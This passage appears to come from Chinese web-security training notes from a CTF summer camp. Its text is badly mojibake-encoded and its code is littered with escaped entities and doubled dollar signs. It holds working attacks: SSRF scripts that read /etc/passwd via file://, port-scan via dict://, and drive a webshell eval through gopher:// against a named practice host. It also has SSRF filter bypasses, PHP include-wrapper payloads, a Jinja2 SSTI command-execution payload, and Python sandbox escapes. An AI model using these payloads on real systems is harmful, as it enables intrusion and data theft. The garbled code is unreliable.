ä»¥\u0026#34;\u0026lt;\u0026gt;+\u0026#34;å¼€å¤´çš„è¡Œä¸è®¡å…¥è®¡ç®— \t# ä»¥\u0026lt;\u0026gt;å¼€å¤´çš„è¡¨ç¤ºè¯·æ±‚å’Œè¿”å›çš„æ—¶é—´ï¼Œå¦‚æœå‰ä¸‰ä¸ªå­—ç¬¦æ˜¯+OKè¡¨ç¤ºè¿”å›çš„å­—ç¬¦ä¸² \tcontinue \telif line == \u0026#39;\\x0a\u0026#39;: # å¦‚æœè¯¥è¡Œåªæœ‰ä¸€ä¸ª0x0aå­—ç¬¦ \texp = exp + \u0026#39;%0a\u0026#39; # ç©ºç™½è¡Œæ›¿æ¢ä¸º%0a \telif line[-3:-1] == r\u0026#39;\\r\u0026#39;: # åˆ¤è¯¥è¡Œçš„å€’æ•°ç¬¬3åˆ°å€’æ•°ç¬¬2ä½æ˜¯å¦ä¸ºr\u0026#39;\\r\u0026#39; \tif len(line) == 3: # å¦‚æœè¯¥è¡Œçš„é•¿åº¦ä¸º3ï¼Œå³ä¸Šä¸€æ­¥åˆ¤æ–­çš„ä¸ºå…¨éƒ¨çš„å†…å®¹ \texp = exp + \u0026#39;%0a%0d%0a\u0026#39;  else:  line = line.replace(r\u0026#39;\\r\u0026#39;,\u0026#39;%0d%0a\u0026#39;)  line = line.replace(\u0026#39;\\n\u0026#39;,\u0026#39;\u0026#39;)  exp = exp + line \telse: \tline = line.replace(\u0026#39;\\n\u0026#39;,\u0026#39;\u0026#39;) \texp = exp + line SSRFç»ƒä¹  #   è¯»å–passwordæ‰€åœ¨æ–‡ä»¶ï¼šhttp://oj.momomoxiaoxi.com:9090/index.php?url=file:///etc/passwd â†’ ä¸€èˆ¬åªç”¨äºæµ‹è¯•payloadæ˜¯å¦æœ‰æ•ˆã€‚ ä½¿ç”¨dirsearchå¯¹ç›®æ ‡è¿›è¡Œæ‰«æï¼š python dirsearch.py http://oj.momomoxiaoxi.com:9090 -e php æ‰«æå‡ºä¸€ä¸ª robots.txt æ–‡ä»¶ï¼Œæˆ‘ä»¬å†ç”¨ç¬¬ä¸€æ­¥çš„æ–¹æ³•è®¿é—®è¯¥æ–‡ä»¶ â†’ http://oj.momomoxiaoxi.com:9090/index.php?url=file:///var/www/html/robots.txt â†’ å…¶ä¸­ /var/www/html/ æ˜¯Apacheçš„æ ¹æ–‡ä»¶å¤¹ï¼Œæ‰«ææ–‡ä»¶æ²¡æœ‰è¶Šæƒæ— æ³•è·å¾—æ“ä½œç³»ç»Ÿçš„æ ¹æ–‡ä»¶å¤¹ï¼Œè®¤ä¸ºApacheçš„å…¥å£æ–‡ä»¶å¤¹ä¸ºæ ¹æ–‡ä»¶å¤¹ åœ¨robots.txtæ–‡ä»¶ä¸­å­˜åœ¨ä¸€ä¸ª webshe11111111.php æ–‡ä»¶ï¼Œæˆ‘ä»¬ç”¨åŒæ ·çš„æ–¹æ³•è®¿é—®è¯¥æ–‡ä»¶ â†’ view-source:http://oj.momomoxiaoxi.com:9090/index.php?url=file:///var/www/html/webshe11111111.php å¾—åˆ°phpæºä»£ç ï¼š  \u0026lt;?php $serverList = array(  \u0026#34;127.0.0.1\u0026#34; ); $$ip = $$_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; foreach ($$serverList as $$host) {  if ($$ip === $$host) {  if ((!empty($$_POST[\u0026#39;admin\u0026#39;])) and $$_POST[\u0026#39;admin\u0026#39;] === \u0026#39;h1admin\u0026#39;) {  @eval($_POST[\u0026#39;hacker\u0026#39;]);  } else die(\u0026#34;You aren\u0026#39;t admin!\u0026#34;);  } else die(\u0026#39;This is webshell\u0026#39;); } ?\u0026gt;åˆ©ç”¨dictåè®®æŸ¥çœ‹ç«¯å£å¼€å¯æƒ…å†µï¼Œä»¥ä¸‹ä¸ºç¼–å†™Pythonè„šæœ¬ï¼š  import requests  url = \u0026#39;http://oj.momomoxiaoxi.com:9090/index.php?url=\u0026#39; defaultlen = len(requests.get(url+\u0026#39;dict://127.0.0.1:0/info\u0026#39;).content) print(\u0026#34;defaultlen:%d\u0026#34;%defaultlen)  for x in range(1000):  try:  response = requests.get(url+\u0026#39;dict://127.0.0.1:%s/info\u0026#39;%str(x))  if len(response.content) != defaultlen:  print(\u0026#34;Port %s, content: %s\u0026#34;%(str(x), response.content))  except Exception as e:  print(e)  pass æˆ‘ä»¬å‘ç°22ç«¯å£å’Œ80ç«¯å£å¤„äºå¼€å¯çŠ¶æ€ï¼Œå…¶ä¸­80ç«¯å£è¿”å›400 Bad Requestï¼Œæˆ‘ä»¬å°è¯•ä½¿ç”¨9090ç«¯å£ä½œä¸ºè·³æ¿æ”»å‡»80ç«¯å£ é…ç½®æœ¬åœ°ç¯å¢ƒï¼šä½¿ç”¨Apacheæ‰“å¼€ä¸¤ä¸ªç«¯å£è¿›è¡Œæµ‹è¯•ï¼Œåœ¨å…¶ä¸­ä¸€ä¸ªç«¯å£é…ç½®ä¹‹å‰æŠ“å–ä¸‹æ¥çš„PHPæ–‡ä»¶ï¼Œå¹¶å‘å…¶å‘é€POSTè¯·æ±‚ï¼Œä½¿ç”¨FireFoxæŠ“å–å‘é€çš„æ•°æ®åŒ…ï¼Œå¤åˆ¶è¿›å…¥Pythonå³å¯è·å¾—ä»¥ä¸‹Pythonè„šæœ¬ï¼š  import urllib.parse from selenium import webdriver  PostHead = \u0026#34;\u0026#34;\u0026#34;\\ POST /webshe11111111.php HTTP/1.1 Host: 127.0.0.1:80 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Referer: http://127.0.0.1:9090/ Content-Type: application/x-www-form-urlencoded Content-Length: 31 Connection: keep-alive Upgrade-Insecure-Requests: 1 admin=h1admin\u0026amp;hacker=phpinfo(); \u0026#34;\u0026#34;\u0026#34; shellurl = \u0026#34;http://oj.momomoxiaoxi.com:9090/index.php?url=gopher://127.0.0.1:80/\u0026#34;  firstParse = urllib.parse.quote(PostHead) new = firstParse.replace(\u0026#34;%0A\u0026#34;,\u0026#34;%0D%0A\u0026#34;) secondParse = \u0026#34;_\u0026#34; + urllib.parse.quote(new)  getrequest = shellurl + secondParse  driver = webdriver.Chrome() driver.get(getrequest) æˆ‘ä»¬å‘ç°é¡µé¢æ­£å¸¸æ˜¾ç¤ºäº†phpinfo()é¡µé¢ï¼Œè¯´æ˜æˆ‘ä»¬çš„shellåå¼¹æˆåŠŸäº†ï¼Œæ¥ä¸‹æ¥æ›´æ”¹evalæ‰§è¡Œä»£ç å’Œé•¿åº¦å°±å¯ä»¥å¾—åˆ°webshelläº†ã€‚   PSå…¶ä»–ï¼š å¸¸è§urlç¼–ç ï¼ˆhttps://www.w3schools.com/tags/ref_urlencode.aspï¼‰ï¼š     Char \\r : ; \\n % = \u0026amp; , space     url-encode %0A %3A %3B %0D %25 %3D %26 %2C %20    SSRFå¸¸è§çš„ç»•è¿‡æŠ€å·§ #   æ›´æ”¹IPåœ°å€å†™æ³•  ä¸€äº›å¼€å‘è€…ä¼šé€šè¿‡ä¼ è¿‡æ¥çš„URLå‚æ•°è¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…æ¥è¿‡æ»¤å†…ç½‘IPï¼Œæ¯”å¦‚  ^10(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d)){3}$ ^172\\.([1][6-9]|[2]\\d|3[01])(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d)){2}$ ^192\\.168(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d)){2}$   æˆ‘ä»¬å¯ä»¥é‡‡ç”¨æ”¹ç¼–IPçš„æ–¹å¼è¿›è¡Œç»•è¿‡ã€‚æ¯”å¦‚åœ°å€192.168.0.1å¯ä»¥å†™æˆï¼š  å…«è¿›åˆ¶æ ¼å¼ï¼š0300.0250.0.1 åå…­è¿›åˆ¶æ ¼å¼ï¼šC0.A8.0.1 åè¿›åˆ¶æ•´æ•°æ ¼å¼ï¼š3232235521 åå…­è¿›åˆ¶æ•´æ•°æ ¼å¼ï¼š0xC0A80001     åˆ©ç”¨è§£æURLæ‰€å‡ºç°çš„é—®é¢˜  åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œåç«¯ç¨‹åºå¯èƒ½ä¼šå¯¹è®¿é—®çš„URLè¿›è¡Œè§£æï¼Œå¯¹è§£æå‡ºæ¥çš„hoståœ°å€è¿›è¡Œè¿‡æ»¤ã€‚è§£æä¸å½“å¯èƒ½å¯¼è‡´ç»•è¿‡ã€‚æ¯”å¦‚ï¼šhttp://www.baidu.com@192.168.0.1/ å®é™…ä¸Šè¯·æ±‚çš„æ˜¯192.168.0.1ä¸Šçš„å†…å®¹ã€‚   åˆ©ç”¨302è·³è½¬  åœ¨ç½‘ç»œä¸Šå­˜åœ¨ä¸€ä¸ªå¾ˆç¥å¥‡çš„æœåŠ¡ï¼šå½“æˆ‘ä»¬è®¿é—® http://xip.io è¿™ä¸ªç½‘ç«™çš„å­åŸŸåæ—¶ï¼Œä¼šå°†å­åŸŸåè‡ªåŠ¨é‡å®šå‘åˆ°é«˜ä¸€çº§çš„åŸŸåï¼Œæ¯”å¦‚ http://192.168.0.1.xip.io â†’ http://192.168.0.1 ã€‚  å¦å¤–ï¼Œå†…ç½‘IPæœ‰å¯èƒ½ä¼šè¢«æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤æ‰ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡çŸ­åœ°å€çš„æ–¹å¼æ¥ç»•è¿‡ã€‚ä½¿ç”¨ç½‘å€   ä¹Ÿå¯ä»¥è‡ªå·±å®ç°ä¸€ä¸ª302è·³è½¬ã€‚åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šéƒ¨ç½²ä¸€ä¸ªä¸­è½¬è·³è½¬æ–‡ä»¶ï¼Œè·³è½¬åˆ°å†…ç½‘åœ°å€ï¼ˆ127.0.0.1ï¼‰ï¼ˆæ˜¯åœ¨é™åˆ¶äº†å¯ç”¨åè®®ä¸ºhttp(s)ï¼Œä½†æ”¯æŒCURLOPT_FOLLOWLOCATIONä¸‹çš„å‘¨è½¬æªæ–½ã€‚   é€šè¿‡å„ç§éHTTPåè®®  å¦‚æœæœåŠ¡ç«¯ç¨‹åºå¯¹è®¿é—®URLæ‰€é‡‡ç”¨çš„åè®®è¿›è¡ŒéªŒè¯çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡éHTTPåè®®è¿›è¡Œåˆ©ç”¨ã€‚ ä¸»è¦æœ‰ä¸¤ä¸ªåè®®ï¼šgopher://åè®®ä¸file://   åˆ©ç”¨DNS Rebinding  å®Œæ•´çš„æ”»å‡»æµç¨‹ï¼š  æœåŠ¡å™¨è·å¾—URLå‚æ•°ï¼Œè¿›è¡Œç¬¬ä¸€æ¬¡DNSè§£æï¼Œè·å¾—äº†ä¸€ä¸ªéå†…ç½‘çš„IP å¯¹äºè·å¾—çš„IPè¿›è¡Œåˆ¤æ–­ï¼Œå‘ç°ä¸ºéé»‘åå•IPï¼Œåˆ™é€šè¿‡éªŒè¯ æœåŠ¡å™¨å¯¹äºURLè¿›è¡Œè®¿é—®ï¼Œç”±äºDNSæœåŠ¡å™¨è®¾ç½®çš„TTLä¸º0ï¼Œæ‰€ä»¥å†æ¬¡è¿›è¡ŒDNSè§£æï¼Œè¿™ä¸€æ¬¡DNSæœåŠ¡å™¨è¿”å›çš„æ˜¯å†…ç½‘åœ°å€ ç”±äºå·²ç»ç»•è¿‡éªŒè¯ï¼Œæ‰€ä»¥æœåŠ¡å™¨è¿”å›è®¿é—®å†…ç½‘èµ„æºçš„ç»“æœ     PSï¼šåˆ©ç”¨æµè§ˆå™¨ï¼š127ã€‚0ã€‚0ã€‚1 â†’æµè§ˆå™¨è§£æâ†’ 127.0.0.1  SSRFé˜²å¾¡ #   è¿‡æ»¤è¿”å›ä¿¡æ¯ï¼›ç»Ÿä¸€é”™è¯¯ä¿¡æ¯ï¼›é™åˆ¶è¯·æ±‚ç«¯å£ä¸ºHTTPå¸¸ç”¨ç«¯å£ï¼ˆ80ã€443ã€8080ã€8090ï¼‰ï¼›é»‘åå•å†…ç½‘IPï¼Œç»™è¯·æ±‚åŸŸè®¾ç½®ç™½åå•ï¼›ç¦æ­¢ä¸éœ€è¦çš„åè®®ï¼›ç¦æ­¢è¯·æ±‚åŸŸåçš„301çš„è·³è½¬ã€‚  ä»£ç æ‰§è¡ŒåŠå‘½ä»¤æ‰§è¡Œæ¼æ´ #    ä»£ç æ³¨å…¥é«˜å±å‡½æ•°ï¼ševal()ã€assert()ã€preg_replace()ã€call_user_func()\u0026hellip;\n evalå’Œassertå‡½æ•°ï¼šè¿™ä¸¤ä¸ªå‡½æ•°åŸæœ¬ä½œç”¨äºåŠ¨æ€ä»£ç æ‰§è¡Œï¼š  \u0026lt;?php  error_reporting(0); \tshow_source(__FILE__);   $$a = @$$_REQUEST[\u0026#39;hello\u0026#39;];  eval(\u0026#34;var_dump($a);\u0026#34;); ?\u0026gt; preg_replace() å‡½æ•°åŸå‹ï¼šmixed preg_replace(mixed $$pattern, mixed $replace, mixed $subject [, int $limit = -1 [, int \u0026amp;$count]])ã€‚å½“ $pattern ä¸­å­˜åœ¨ /e æ¨¡å¼ä¿®é¥°ç¬¦æ—¶ï¼Œ$$replacement ä¼šè¢«çœ‹æˆPHPä»£ç æ¥æ‰§è¡Œã€‚æ¯”å¦‚ä¸‹é¢çš„ç¨‹åºä¼šæ‰§è¡Œæ›¿æ¢åçš„ \\\\1 çš„ä»£ç ï¼š  preg_replace(\u0026#34;/\\[(.*)\\]/e\u0026#34;, \u0026#34;\\\\1\u0026#34;, $_GET[\u0026#39;str\u0026#39;]);   æ–‡ä»¶åŒ…å«æ³¨é«˜å±å‡½æ•°ï¼šinclude()ã€include_once()ã€require()ã€require_once()ã€‚ä»¥åŠå„ä¸ªä¼ªåè®®ï¼š\n  php:// ä¼ªåè®®å¯ä»¥è®¿é—®å„ä¸ªè¾“å…¥è¾“å‡ºæµã€‚å¸¸è§ç”¨æ³•ï¼šphp://input â†’\n  è§£é‡Šï¼šphp://input æŒ‡å‘åŸå§‹POSTæ•°æ®\n  ç”¨æ³•ï¼šæ¯”å¦‚ä»¥ä¸‹Demoå¯ä»¥å®ç°ç®€å•åˆ©ç”¨\n// GETæ•°æ®ï¼šlocalhost:8080/?payload=php://input // POSTæ•°æ®ï¼šSimple Use // åç«¯ç¨‹åºï¼šindex.php =\u0026gt; \u0026lt;?php echo file_get_contents($_GET[\u0026#39;payload\u0026#39;]); ?\u0026gt;  å¦‚æœphp.inié‡Œé¢çš„ allow_url_include=On(PHP \u0026lt; 5.30) å°±å¯ä»¥é€ æˆä»»æ„ä»£ç æ‰§è¡Œï¼Œåœ¨è¿™é‡Œå¯ä»¥ç†è§£æˆè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆRFIï¼‰ï¼Œå³POSTä¸€å¥è¯å°±å¯ä»¥æ‰§è¡Œã€‚å½“headå¤´ä¸­æœ‰ enctype=\u0026quot;multipart/form-data\u0026quot; æ—¶ï¼Œè¯¥ä¼ªåè®®æ— æ•ˆã€‚\n    data:// ä¼ªåè®®ä¸ºæ•°æ®å°è£…å™¨ï¼Œå°†åŸæœ¬çš„includeçš„æ–‡ä»¶æµé‡å®šå‘åˆ°äº†ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„è¾“å…¥æµä¸­ï¼Œå°±æ˜¯è¯´æ‰§è¡Œçš„æ–‡ä»¶åŒ…å«æ–¹æ³•åŒ…å«äº†è¾“å…¥æµã€‚å¸¸è§ç”¨æ³•ï¼šdata://text/plain â†’\n  è§£é‡Šï¼šä¸€ç§ä¸éœ€è¦å‘å…¶ä»–ä½ç½®å¯»æ‰¾æ•°æ®çš„æ•°æ®åè®®æè¿°æ–¹å¼ã€‚\n  ç”¨æ³•ï¼šdata:[\u0026lt;mime type\u0026gt;][;charset=\u0026lt;charset\u0026gt;][;\u0026lt;encoding\u0026gt;],\u0026lt;encoded data\u0026gt;\n// payload: \u0026lt;?php phpinfo() // payload_base64: PD9waHAgcGhwaW5mbygpOw== // URI: localhost:8080/?payload=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw== // åç«¯ç¨‹åºï¼šindex.php =\u0026gt; \u0026lt;?php include($_GET[\u0026#39;payload\u0026#39;]);   æ³¨æ„ï¼špayloadæ²¡æœ‰ ?\u0026gt; é—­åˆã€‚å¦‚æœphp.inié‡Œé¢çš„ allow_url_include=On ï¼Œå°±å¯ä»¥é€ æˆä»»æ„ä»£ç æ‰§è¡Œã€‚\n    phar:// ä¼ªåè®®äº¦ä¸ºæ•°æ®å°è£…å™¨ï¼Œphpè§£å‹ç¼©åŒ…çš„å‡½æ•°ï¼Œè§£å‹çš„å‹ç¼©åŒ…ä¸åç¼€æ— å…³ã€‚\n  ç”¨æ³•ï¼šphar://å‹ç¼©åŒ…/å†…éƒ¨æ–‡ä»¶ ã€‚æ¯”å¦‚ï¼š\n// php.php =\u0026gt; \u0026lt;?php phpinfo(); ?\u0026gt;// php.php -\u0026gt; php.zip æ”¾åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹ // URIï¼šlocalhost:8080/?payload=phar://php.zip/php.php // åç«¯ç¨‹åºï¼šindex.php =\u0026gt; \u0026lt;?php include($_GET[\u0026#39;payload\u0026#39;]);   æ³¨æ„ï¼šphpç‰ˆæœ¬éœ€è¦å¤§äº5.3ï¼Œå‹ç¼©åŒ…æ ¼å¼æ˜¯zipï¼Œåˆ©ç”¨urlçš„å‹ç¼©åŒ…åç¼€å¯ä»¥æ˜¯ä»»æ„åç¼€ã€‚\n      å‘½ä»¤æ‰§è¡Œé«˜å±å‡½æ•°ï¼šsystem()ã€exec()ã€shell_exec()ã€passthru()ã€pctnl_exec()ã€popen()ã€proc_open()\u0026hellip;\n  è¡¥å……çŸ¥è¯† #  å˜é‡è¦†ç›– #   æŒ‡çš„æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨è‡ªå®šä¹‰çš„å‚æ•°å€¼æ¥æ›¿æ¢ç¨‹åºåŸæœ‰çš„å˜é‡å€¼ã€‚ ä¸»è¦åŸå› å¤§å¤šç”±å‡½æ•°ä½¿ç”¨ä¸å½“é€ æˆçš„ã€‚ä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªå‡½æ•°ï¼šextract()ã€Parse_str()ã€import_request_variables()ï¼›è¿˜æœ‰éƒ¨åˆ†åº”ç”¨$$$$æ–¹å¼è¿›è¡Œå˜é‡æ³¨å†Œä¹Ÿå®¹æ˜“å¯¼è‡´å˜é‡è¦†ç›–ã€‚  \u0026lt;?php $chr = \u0026#39;\u0026#39;; if($$_POST \u0026amp;\u0026amp; $$charset != \u0026#39;utf-8\u0026#39;){  $$chs = new Chinese(\u0026#39;UTF-8\u0026#39;, $$charset);  foreach($$_POST as $key =\u0026gt; $$value)  $$$key = $chs-\u0026gt;Convert($$value);  unset($chs); } ?\u0026gt;å…¨å±€å˜é‡æ³„éœ² #  \u0026lt;?php  include \u0026#34;flag.php\u0026#34;; \t$$a = @$$_REQUEST[\u0026#39;hello\u0026#39;]; \tif(!preg_match(\u0026#39;/^\\w*$$/\u0026#39;,$$a))  die(\u0026#39;ERROR\u0026#39;); \teval(\u0026#34;val_dump($$$$a);\u0026#34;); \tshow_source(__FILE__); ?\u0026gt;ChinaZä¾‹é¢˜è®²è§£ #  "},{"id":215,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day9/","title":"Day9","section":"Xman3å¤ä»¤è¥","content":"Pythonä»£ç å®¡è®¡ #  OSå‘½ä»¤æ³¨å…¥ #    ä¸OSå‘½ä»¤æ³¨å…¥æ”»å‡»ç›¸å…³çš„æ¨¡å—ï¼ševal()ã€os.system()ã€os.popen*ã€subprocess.popenos.spawn*ã€commands.*ã€popen2.*ã€‚\n ä¸‹é¢æ˜¯ä¸€ä¸ªç”¨Pythonä¸­Djangoå†™çš„ï¼Œå¯ä»¥åˆ©ç”¨evalå‘½ä»¤æ³¨å…¥çš„ç®€å•Python WebæœåŠ¡çš„Demoï¼š  def eval_test(request):  if request.method == \u0026#39;GET\u0026#39;:  return render_to_response(\u0026#39;eval.html\u0026#39;,context_instance=RequesetContext(request))  elif request.method == \u0026#39;POST\u0026#39;:  domain = request.POST.get(\u0026#39;domain\u0026#39;,\u0026#39;\u0026#39;)  command = \u0026#34;os.popen(\u0026#39;whois\u0026#34; + domain + \u0026#34;\u0026#39;)\u0026#34;  output = eval(command)  return render_to_response(\u0026#39;eval.html\u0026#39;, {\u0026#39;output\u0026#39;:output.readlines()}, context_instance=RequestContext(request))  OSå‘½ä»¤æ³¨å…¥ï¼šsubprocess.callå‡½æ•°ï¼ˆshell=Trueæ—¶ï¼Œå‡½æ•°ä¼šåœ¨å‘½ä»¤å‰æ·»åŠ -cé€‰é¡¹ï¼‰ã€‚å¼€å‘å»ºè®® â†’ ä½¿ç”¨pipes.quote()å‡½æ•°å»è¿‡æ»¤ç”¨æˆ·è¾“å…¥ï¼›å°½é‡ä¸è¦ä½¿ç”¨shell=True\u0026hellip;  subprocess.call(\u0026#34;cat \u0026#34; + user_input, shell=True) subprocess.call(\u0026#34;cat %s\u0026#34;%(user_input), shell=True) subprocess.call(\u0026#34;cat {0}\u0026#34;.format(user_input), shell=True)   ç®€å•ç»ƒä¹  #  @app.route(\u0026#34;/eval/\u0026#34;) def eval_test():  ip = request.args.get(\u0026#39;ip\u0026#39;, \u0026#39;127.0.0.1\u0026#39;)  output = os.popen(\u0026#39;ping -c 2\u0026#39; + ip).readlines()  output = \u0026#39;\u0026lt;br\u0026gt;\u0026#39;.join(output)  t = Template(output)  return r.render() æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰ #    å‘ç”Ÿåœ¨MVCæ¡†æ¶çš„viewå±‚ã€‚\n æ¨¡æ¿æ³¨å…¥ï¼š{{9-6}}ï¼Œåœ¨æ‹¬å·å†…çš„å†…å®¹ä¼šè¢«å½“ä½œPythonæ¨¡æ¿è¢«æ‰§è¡Œ  @app.route(\u0026#34;/\u0026#34;) def index():  name = request.args.get(\u0026#39;name\u0026#39;, \u0026#39;guest\u0026#39;)  t = Template(\u0026#39;Hello\u0026#39;, name)  return t.render()  åˆ©ç”¨jinjia2è¯­æ³•æ‰§è¡Œå‘½ä»¤ï¼š  {% for c in [].__class__.__base__.__subclass__() %} \t{% if c.__name__ == \u0026#39;catch_warnings\u0026#39; %}  {% for b in c.__init__.globals__.values() %}  {% if b.__class__ == {}.__class__ %}  {% if \u0026#39;eval\u0026#39; in b.keys() %}  {{ b[\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;id\u0026#34;).read()\u0026#39;) }}  {% endif %}  {% endif %}  {% endfor %}  {% endif %} {% endfor %} [].__class__.__base__.subclasses__()[60].__init__.__globals__.values()[13][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;id\u0026#34;).read()\u0026#39;)   æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ç›¸å½“äºæ§åˆ¶äº†å¯¹æ–¹çš„viewå±‚ï¼Œå¯ä»¥è·å¾—ä¸€åˆ‡jinja2ä¸­å¯ä»¥è·å–çš„æ•°æ®ã€‚ä½†æ­¤æ—¶æˆ‘ä»¬ä»ç„¶åœ¨jinja2çš„æ²™ç®±ä¸­ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦ç»•è¿‡æ²™ç®±ã€‚\n  Pythonæ²™ç®±é€ƒé€¸ #   æ²™ç®±ä¸€èˆ¬æ˜¯é™åˆ¶æŒ‡å®šå‡½æ•°çš„è¿è¡Œï¼Œæˆ–è€…å¯¹æŒ‡å®šæ¨¡å—çš„åˆ é™¤ä»¥åŠè¿‡æ»¤  ä»»æ„ä»£ç æ‰§è¡Œ #   ä¸€äº›ä»»æ„ä»£ç æ‰§è¡Œä»¥åŠæ–‡ä»¶è¯»å–çš„å‡½æ•°  osæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼šos.system('ipconfig') execä»»æ„ä»£ç æ‰§è¡Œï¼šexec('__import__(\u0026quot;os\u0026quot;).system(\u0026quot;ipconfig\u0026quot;)') evalä»»æ„ä»£ç æ‰§è¡Œï¼ševal('__import__(\u0026quot;os\u0026quot;).system(\u0026quot;ipconfig\u0026quot;)') timeit â†’ æœ¬æ˜¯æ£€æµ‹æœ¬æœºæ€§èƒ½çš„ï¼Œä¹Ÿå¯ä»¥ä»»æ„ä»£ç æ‰§è¡Œï¼štimeit.timeit(\u0026quot;__import__('os').system('ipconfig')\u0026quot;, number=1) platformï¼šplatform.popen('ipconfig').read() subprocessï¼šsubprocess.Popen('ipconfig', shell=True, stdout=subprocess.PIPE, stderr=subprocess) fileï¼šfile('/etc/passwd').read() openï¼šopen('/etc/passwd').read() codecsï¼šcodecs.open('/etc/passwd').read()    å…¶ä»–æ”»å‡»æ–¹æ³• #   PSï¼šBypassæ˜æ–‡è¿‡æ»¤æºç   import re pattern = re.complile(\u0026#39;(os|commands|subprocess|sys)\u0026#39;) while True:  code = raw_input(\u0026#39;\u0026#39;)  match = re.search(pattern, code)  if match:  print(\u0026#34;forbidden module import detected.\u0026#34;)  else:  print(\u0026#34;Succ!\u0026#34;)  base64ç¼–ç æ–¹å¼é€ƒé€¸ï¼ˆåªé€‚ç”¨äºPython2ï¼‰ã€‚ä¾‹å­ï¼š  __buildins__.__dict__[\u0026#39;X19pbXBvcnRfXw==\u0026#39;.decode(\u0026#39;base64\u0026#39;)](\u0026#39;b3M=\u0026#39;.decode(\u0026#39;base64\u0026#39;)) # ç­‰ä»·äº __buildins__.__dict__[\u0026#39;__import__\u0026#39;](os)   æ ¼å¼åŒ–å­—ç¬¦ä¸²é—®é¢˜ã€‚\n åœ¨ä»¥ä¸‹ä»£ç ä¸­ï¼Œå¦‚æœç”¨æˆ·è¾“å…¥%(password)s å°±å¯ä»¥è·å¾—ç”¨æˆ·çš„çœŸå®å¯†ç äº†ã€‚  userdata = {\u0026#34;user\u0026#34;:\u0026#34;jdoe\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;secrect\u0026#34;} passwd = raw_input(\u0026#34;Password:\u0026#34;)  if passwd != userdata[\u0026#34;password\u0026#34;]:  print(\u0026#34;Password \u0026#34;+ passwd + \u0026#34; is wrong for user %(user)s\u0026#34;)\t%userdata åœ¨ä»¥ä¸‹ä»£ç ä¸­å¯ä»¥é€šè¿‡{event.__init__.__globals__[CONFIG][SECRET_KEY]} å°±å¯ä»¥æ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚  CONFIG = {  \u0026#39;SECRET_KEY\u0026#39;: \u0026#39;super secret key\u0026#39; }  class Event(object):  def __init__(self, id, level, message):  self.id = id  self.level = level  self.message = message  def format_event(format_string, event):  return format_string.format(event=event)   ä½¿ç”¨delè¿‡æ»¤é˜²å¾¡ #  del __builtins__.__dict__[\u0026#39;__import__\u0026#39;] del __builtins__.__dict__[\u0026#39;eval\u0026#39;] del __builtins__.__dict__[\u0026#39;execfile\u0026#39;] del __builtins__.__dict__[\u0026#39;input\u0026#39;] # å› ä¸ºå¯ä»¥ç»•è¿‡delè¿‡æ»¤ï¼šreload(__buildtins__)ï¼Œè§£å†³åŠæ³•ï¼š del __builtins__.__dict__[\u0026#39;reload\u0026#39;] ååºåˆ—åŒ– #    pickle.dump(obj, file[,protocol]) â†’ åºåˆ—åŒ–å¯¹è±¡ï¼Œå¹¶å°†ç»“æœæ•°æ®å†™å…¥åˆ°æ–‡ä»¶å¯¹è±¡ä¸­ï¼ˆprotocolæ˜¯åºåˆ—åŒ–æ¨¡å¼ï¼Œé»˜è®¤å€¼ä¸º0ä»¥æ–‡æœ¬çš„å½¢å¼åºåˆ—åŒ–ï¼‰\n  pickle.load(file) â†’ ååºåˆ—åŒ–å¯¹è±¡ï¼Œå°†æ–‡ä»¶ä¸­çš„æ•°æ®è§£ææˆä¸ºä¸€ä¸ªPythonå¯¹è±¡ã€‚\n  pickleçš„å…¸å‹åº”ç”¨åœºæ™¯ï¼š\n é€šå¸¸åœ¨è§£æè®¤è¯tokenã€sessionçš„æ—¶å€™ï¼› å¯èƒ½å°†å¯¹è±¡Pickleåå­˜å‚¨æˆç£ç›˜æ–‡ä»¶ï¼› å¯èƒ½å°†å¯¹è±¡Pickleååœ¨ç½‘ç»œä¸­ä¼ è¾“ï¼› å¯èƒ½å‚æ•°ä¼ é€’ç»™ç¨‹åºï¼Œæ¯”å¦‚ä¸€ä¸ªsqlmapä»£ç æ‰§è¡Œæ¼æ´ã€‚    å†…ç½‘æ¸—é€ #   é¢„äº¤äº’ã€æƒ…æŠ¥æœé›†ã€å¨èƒå»ºæ¨¡ã€è„†å¼±ç‚¹åˆ†æã€æ¼æ´åˆ©ç”¨ã€åæ¼æ´åˆ©ç”¨ã€æ’°å†™æŠ¥å‘Š  æ‰«æç½‘ç»œ #   è¢«åŠ¨ä¿¡æ¯æ‰«æ â†’ å¼€æºæƒ…æŠ¥ï¼ˆOSINTï¼‰  